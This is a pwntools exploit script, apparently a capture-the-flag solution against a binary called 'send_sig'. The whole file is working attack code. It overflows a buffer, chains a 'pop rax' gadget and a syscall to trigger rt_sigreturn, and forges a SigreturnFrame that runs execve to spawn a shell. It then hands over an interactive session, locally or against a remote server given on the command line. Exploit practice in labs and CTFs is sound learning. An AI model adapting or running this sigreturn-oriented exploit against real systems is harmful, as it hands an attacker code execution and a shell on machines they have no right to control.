from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x00000000004010B6
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './send_sig'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
rop = ROP(elf)
payload = b'a' * 16
payload += p64(rop.find_gadget(['pop rax', 'ret']).address)
payload += p64(0xf)
payload += p64(0x00000000004010b0)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = 0x0000000000402000
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x00000000004010b0

payload += bytes(frame)
p.send(payload)
p.interactive()